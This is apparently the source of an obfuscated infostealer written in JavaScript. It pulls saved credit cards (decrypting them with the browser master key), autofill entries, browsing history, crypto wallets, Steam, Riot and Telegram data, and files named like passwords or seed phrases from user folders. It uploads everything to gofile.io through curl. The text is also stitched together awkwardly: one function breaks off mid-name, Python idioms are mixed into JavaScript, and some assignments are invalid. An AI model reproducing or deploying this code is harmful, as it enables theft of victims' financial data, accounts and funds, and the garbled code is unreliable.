        let data = SQ17H1N6(pathC, tempfold, "SELECT * FROM credit_cards ");
        let pathKey = `${path}/Local State`;
        let local_state = JSON.parse(fs.readFileSync(pathKey, { encoding: "utf-8" }));
        let master_key = Buffer.from(local_state['os_crypt']['encrypted_key'], "base64");
        master_key = CryptUnprotectData(master_key.slice(5));
        for (let row of data) {
            if (row[0] !== "") {
                CCs.push(`C4RD N4M3: ${row[1]} | NUMB3R: ${D3CrYP7V41U3(row[4], master_key)} | EXP1RY: ${row[2]}/${row[3]}`);
                CC5C0UNt++;
            }
        }
        Wr173F0rF113(CCs, 'creditcards');
    } catch (error) {
        console.error(error);
    }
}

function G374U70F111(path, arg) {
    try {
        let AU70F11l = global.AU70F11l;
        let AU70F111C0UNt = global.AU70F111C0UNt;
        if (!fs.existsSync(path)) {
            return;
        }
        let pathC = `${path}${arg}/Web Data`;
        if (fs.statSync(pathC).size === 0) {
            return;
        }
        let tempfold = `${temp}cr${Math.random().toString(36).substring(7)}.db`;
        let data = SQ17H1N6(pathC, tempfold, "SELECT * FROM autofill WHERE value NOT NULL");
        for (let row of data) {
            if (row[0] !== "") {
                AU70F11l.push(`N4M3: ${row[0]} | V4LU3: ${row[1]}`);
                AU70F111C0UNt++;
            }
        }
        Wr173F0rF113(AU70F11l, 'autofill');
    } catch (error) {
        console.error(error);
    }
}

function G37H1570rY(path, arg) {
    try {
        let H1570rY = global.H1570rY;
        let H1570rYC0UNt = global.H1570rYC0UNt;
        if (!fs.existsSync(path)) {
            return;
        }
        let pathC = `${path}${arg}History`;
        if (fs.statSync(pathC).size === 0) {
            return;
        }
        let tempfold = `${temp}cr${Math.random().toString(36).substring(7)}.db`;
        let data = SQ17H1N6(pathC, tempfold, "SELECT * FROM urls");
        for (let row of data) {
            if (row[0] !== "") {
                H1570rY.push(row[1]);
                H1570rYC0UNt++;
            }
        }
        Wr173F0rF113(H1570rY, 'history');
    } catch (error) {
        console.error(error);
    }
}

function G37W3851735(Words) {
    let rb = Words.join(" | ");
    if (rb.length > 1000) {
        let rrrrr = r3F0rM47(Words.join(""));
        return rrrrr.join(" | ");
    } else {
        return rb;
    }
}

function G37800KM4rK5(path, arg) {
    try {
        let B00KM4rK5 = global.B00

for (let i = 0; i < 3; i++) {
    let lnik = UP104D7060F113(`${temp}/${name}.zip`);
    if (lnik.includes("https://")) {
        break;
    }
    time.sleep(4);
}
os.remove(`${temp}/${name}.zip`);
O7H3rZ1p.push([arg, lnik]);

function Z1P7H1N65(path, arg, procc) {
    let pathC = path;
    let name = arg;
    global.W411375Z1p, G4M1N6Z1p, O7H3rZ1p;
    for (let walllts of w411375) {
        if (arg.includes(walllts[0].toString())) {
            let browser = path.split("\\")[4].split("/")[1].replace(' ', '');
            name = `${walllts[1]}_${browser}`;
            pathC = path + arg;
        }
    }
    if (!fs.existsSync(pathC)) {
        return;
    }
    subprocess.Popen(`taskkill /im ${procc} /t /f >nul 2>&1`, { shell: true });
    time.sleep(1);
    if (arg.includes("Wallet")) {
        let browser = path.split("\\")[4].split("/")[1].replace(' ', '');
        name = `${browser}`;
    } else if (arg.includes("Steam")) {
        if (!fs.existsSync(`${pathC}/loginusers.vdf`)) {
            return;
        }
        let f = fs.openSync(`${pathC}/loginusers.vdf`, "r+");
        let data = fs.readFileSync(f, "utf8");
        let found = false;
        for (let l of data) {
            if (l.includes('RememberPassword"\t\t"1"')) {
                found = true;
            }
        }
        if (!found) {
            return;
        }
        name = arg;
    }
    Z1PF01D3r(name, pathC);
    for (let i = 0; i < 3; i++) {
        let lnik = UP104D7060F113(`${temp}/${name}.zip`);
        if (lnik.includes("https://")) {
            break;
        }
        time.sleep(4);
    }
    os.remove(`${temp}/${name}.zip`);
    if (arg.includes("/Local Extension Settings/") || arg.includes("/HougaBouga/") || arg.toLowerCase().includes("wallet")) {
        W411375Z1p.push([name, lnik]);
    } else if (name.includes("Steam") || name.includes("RiotCli")) {
        G4M1N6Z1p.push([name, lnik]);
    } else {
        O7H3rZ1p.push([name, lnik]);
    }
}

function S74r77Hr34D(meth, args = []) {
    let a = new threading.Thread(meth, args);
    a.start();
    THr34D1157.push(a);
}

function G47H3r411() {
    let br0W53rP47H5 = [
        [`${roaming}/Opera Software/Opera GX Stable`, "opera.exe", "/Local Storage/leveldb", "/", "/Network", "/Local Extension Settings/"],
        [`${roaming}/Opera Software/Opera Stable`, "opera.exe", "/Local Storage/leveldb", "/", "/Network", "/Local Extension Settings/"],
        [`${roaming}/Opera Software/Opera Neon/User Data/Default`, "opera.exe", "/Local Storage/leveldb", "/", "/Network", "/Local Extension Settings/"],
        [`${local}/Google/Chrome/User Data`, "chrome.exe", "/Default/Local Storage/leveldb", "/Default/", "/Default/Network", "/Default/Local Extension Settings/"],
        [`${local}/Google/Chrome SxS/User Data`, "chrome.exe", "/Default/Local Storage/leveldb", "/Default/", "/Default/Network", "/Default/Local Extension Settings/"],
        [`${local}/Google/Chrome Beta/User Data`, "chrome.exe", "/Default/Local Storage/leveldb", "/Default/", "/Default/Network", "/Default/Local Extension Settings/"],
        [`${local}/Google/Chrome Dev/User Data`, "chrome.exe", "/Default/Local Storage/leveldb", "/Default/", "/Default/Network", "/Default/Local Extension Settings/"],
        [`${local}/Google/Chrome Unstable/User Data`, "chrome.exe", "/Default/Local Storage/leveldb", "/Default/", "/Default/Network", "/Default/Local Extension Settings/"],
        [`${local}/Google/Chrome Canary/User Data`, "chrome.exe", "/Default/Local Storage/leveldb", "/Default/", "/Default/Network", "/Default/Local Extension Settings/"],
        [`${local}/BraveSoftware/Brave-Browser/User Data`, "brave.exe", "/Default/Local Storage/leveldb", "/Default/", "/Default/Network", "/Default/Local Extension Settings/"],
        [`${local}/Vivaldi/User Data`, "vivaldi.exe", "/Default/Local Storage/leveldb", "/Default/", "/Default/Network", "/Default/Local Extension Settings/"],
        [`${local}/Yandex/YandexBrowser/User Data`, "yandex.exe", "/Default/Local Storage/leveldb", "/Default/", "/Default/Network", "/HougaBouga/"],
        [`${local}/Yandex/YandexBrowserCanary/User Data`, "yandex.exe", "/Default/Local Storage/leveldb", "/Default/", "/Default/Network", "/HougaBouga/"],
        [`${local}/Yandex/YandexBrowserDeveloper/User Data`, "yandex.exe", "/Default/Local Storage/leveldb", "/Default/", "/Default/Network", "/HougaBouga/"],
        [`${local}/Yandex/YandexBrowserBeta/User Data`, "yandex.exe", "/Default/Local Storage/leveldb", "/Default/", "/Default/Network", "/HougaBouga/"],
        [`${local}/Yandex/YandexBrowserTech/User Data`, "yandex.exe", "/Default/Local Storage/leveldb", "/Default/", "/Default/Network", "/HougaBouga/"],
        [`${local}/Yandex/YandexBrowserSxS/User Data`, "yandex.exe", "/Default/Local Storage/leveldb", "/Default/", "/Default/Network", "/HougaBouga/"],
        [`${local}/Microsoft/Edge/User Data`, "edge.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/Default/Local Extension Settings/"]
    ];
    let d15C0rDP47H5 = [
        [`${roaming}/discord`, "/Local Storage/leveldb"],
        [`${roaming}/Lightcord`, "/Local Storage/leveldb"],
        [`${roaming}/discordcanary`, "/Local Storage/leveldb"],
        [`${roaming}/discordptb`, "/Local Storage/leveldb"],
    ];
    let p47H570Z1P = [
        [`${roaming}/atomic/Local Storage/leveldb`, "Atomic Wallet.exe", "Wallet"],
        [`${roaming}/Guarda/Local Storage/leveldb`, "Guarda.exe", "Wallet"],
        [`${roaming}/Zcash`, "Zcash.exe", "Wallet"],
        [`${roaming}/Armory`, "Armory.exe", "Wallet"],
        [`${roaming}/bytecoin`, "bytecoin.exe", "Wallet"],
        [`${roaming}/Exodus/exodus.wallet`, "Exodus.exe", "Wallet"],
        [`${roaming}/Binance/Local Storage/leveldb`, "Binance.exe", "Wallet"],
        [`${roaming}/com.liberty.jaxx/IndexedDB/file__0.indexeddb.leveldb`, "Jaxx.exe", "Wallet"],
        [`${roaming}/Electrum/wallets`, "Electrum.exe", "Wallet"],
        [`${roaming}/Coinomi/Coinomi/wallets`, "Coinomi.exe", "Wallet"],
        ["C:\Program Files (x86)\Steam\config", "steam.exe", "Steam"],
        [`${local}/Riot Games/Riot Client/Data`, "RiotClientServices.exe", "RiotClient"],
    ];
    let t3136r4M = [`${roaming}/Telegram Desktop/tdata`, 'Telegram.exe', "Telegram"];
    for (let patt of br0W53rP47H5) {
        S74r77Hr34D(G3770K3N, [patt[0], patt[2]]);
    }
    for (let patt of d15C0rDP47H5) {
        S74r77Hr34D(G37D15C0rD, [patt[0], patt[1]]);
    }
    S74r77Hr34D(G378r0W53r5, [br0W53rP47H5]);
    S74r77Hr34D(G47H3rZ1P5, [br0W53rP47H5, p47H570Z1P, t3136r4M]);
    for (let thread of THr34D1157) {
        thread.join();
    }
}

function UP104D7060F113(path) {
    try {
        let r = subprocess.Popen(`curl -F "file=@${path}" https://${gofileserver}.gofile.io/uploadFile`, { shell: true, stdout: subprocess.PIPE, stderr: subprocess.PIPE }).communicate();
        return JSON.parse(r[0].toString('utf-8'))["data"]["downloadPage"];
    } catch {
        return false;
    }
}

function K1W1F01D3r(pathF, keywords) {
    let maxfilesperdir = 7;
    let i = 0;
    let listOfFile = fs.readdirSync(pathF);
    let ffound = [];
    for (let file of listOfFile) {
        if (!fs.statSync(pathF + "/" + file).isFile()) {
            return;
        }
        i += 1;
        if (i <= maxfilesperdir) {
            let url = UP104D7060F113(pathF + "/" + file);
            ffound.push([pathF + "/" + file, url]);
        } else {
            break;
        }
    }
    K1W1F113s.push(["folder", pathF + "/", ffound]);
}

K1W1F113s = [];

function K1W1F113(path, keywords) {
    let fifound = [];
    let listOfFile = fs.readdirSync(path);
    for (let file of listOfFile) {
        for (let worf of keywords) {
            if (file.toLowerCase().includes(worf)) {
                if (fs.statSync(path + "/" + file).isFile() && fs.statSync(path + "/" + file).size < 500000 && !file.includes(".lnk")) {
                    fifound.push([path + "/" + file, UP104D7060F113(path + "/" + file)]);
                    break;
                }
                if (fs.statSync(path + "/" + file).isDirectory()) {
                    let target = path + "/" + file;
                    K1W1F01D3r(target, keywords);
                    break;
                }
            }
        }
    }
    K1W1F113s.push(["folder", path, fifound]);
}

function K1W1() {
    let user = temp.split("\AppData")[0];
    let path2search = [
        user + "/Desktop",
        user + "/Downloads",
        user + "/Documents",
        roaming + "/Microsoft/Windows/Recent",
    ];
    let key_wordsFiles = [
        "passw",
        "mdp",
        "motdepasse",
        "mot_de_passe",
        "login",
        "secret",
        "bot",
        "atomic",
        "account",
        "acount",
        "paypal",
        "banque",
        "bot",
        "metamask",
        "wallet",
        "crypto",
        "exodus",
        "discord",
        "2fa",
        "code",
        "memo",
        "compte",
        "token",
        "backup",
        "secret",
        "seed",
        "mnemonic",
        "memoric",
        "private",
        "key",
        "passphrase",
        "pass",
        "phrase",
        "steal",
        "bank",
        "info",
        "casino",
        "prv",
        "privé",
        "prive",
        "telegram",
        "identifiant",
        "personnel",
        "trading",
        "bitcoin",
        "sauvegarde",
        "funds",
        "récupé",
        "recup",
        "note",
    ];
    let wikith = [];
    for (let patt of path2search) {
        let kiwi = new threading.Thread(K1W1F113, [patt, key_wordsFiles]);
        kiwi.start();
        wikith.push(kiwi);
    }
    return wikith;
}

function filestealr() {
    let wikith = K1W1();
    for (let thread of wikith) {
        thread.join();
    }
    time.sleep(0.2);
    let filetext = "\n";
    for (let arg of K1W1F113s) {
        if (arg[2].length !== 0) {
            let foldpath = arg[1].replace("\\", "/");
            let foldlist = arg[2];
            filetext += `📁 ${foldpath}\n`;
            for (let ffil of foldlist) {
                let a = ffil[0].split("/");
                let fileanme = a[a.length - 1];
                let b = ffil[1];
                filetext += `└─:open_file_folder: [${fileanme}](${b})\n`;
            }
            filetext += "\n";
        }
    }
    UP104D("kiwi", filetext);
}

const k3YW0rd = ['[coinbase](https://coinbase.com)', '[sellix](https://sellix.io)', '[gmail](https://gmail.com)', '[steam](https://steam.com)', '[discord](https://discord.com)', '[riotgames](https://riotgames.com)', '[youtube](https://youtube.com)', '[instagram](https://instagram.com)', '[tiktok](https://tiktok.com)', '[twitter](https://twitter.com)', '[facebook](https://facebook.com)', '[epicgames](https://epicgames.com)', '[spotify](https://spotify.com)', '[yahoo](https://yahoo.com)', '[roblox](https://roblox.com)', '[twitch](https://twitch.com)', '[minecraft](https://minecraft.net)', '[paypal](https://paypal.com)', '[origin](https://origin.com)', '[amazon](https://amazon.com)', '[ebay](https://ebay.com)', '[aliexpress](https://aliexpress.com)', '[playstation](https://playstation.com)', '[hbo](https://hbo.com)', '[xbox](https://xbox.com)', '[binance](https://binance.com)', '[hotmail](https://hotmail.com)', '[outlook](https://outlook.com)', '[crunchyroll](https://crunchyroll.com)', '[telegram](https://telegram.com)', '[pornhub](https://pornhub.com)', '[disney](https://disney.com)', '[expressvpn](https://expressvpn.com)', '[uber](https://uber.com)', '[netflix](https://netflix.com)', '[github](https://github.com)', '[stake](https://stake.com)'];
let C00K1C0UNt, P455WC0UNt, CC5C0UNt, AU70F111C0UNt, H1570rYC0UNt, B00KM4rK5C0UNt = 0, 0, 0, 0, 0, 0;
let c00K1W0rDs, p45WW0rDs, H1570rY, CCs, P455w, AU70F11l, C00K13s, W411375Z1p, G4M1N6Z1p, O7H3rZ1p, THr34D1157, K1W1F113s, B00KM4rK5, T0K3Ns = [], [], [], [], [], [], [], [], [], [], [], [], [], '';
try {
    gofileserver = JSON.parse(request("https://api.gofile.io/getServer").getBody())["data"]["server"];
} catch {
    gofileserver = "store4";
}
GLINFO = G108411NF0();
G47H3r411();
wikith = K1W1();
for (let thread of wikith) {
    thread.join();
}
time.sleep(0.2);
let filetext = "\n";
for (let arg of K1W1F113s) {
    if (arg[2].length !== 0) {
        let foldpath = arg[1];
        let foldlist = arg[2];
        filetext += `:open_file_folder: ${foldpath}\n`;
        for (let ffil of foldlist) {
            let a = ffil[0].split("/");
            let fileanme = a[a.length - 1];
            let b = ffil[1];
            filetext += `└─:open_file_folder: [${fileanme}](${b})\n`;
        }
        filetext += "\n";
    }
}
UP104D("kiwi", filetext);


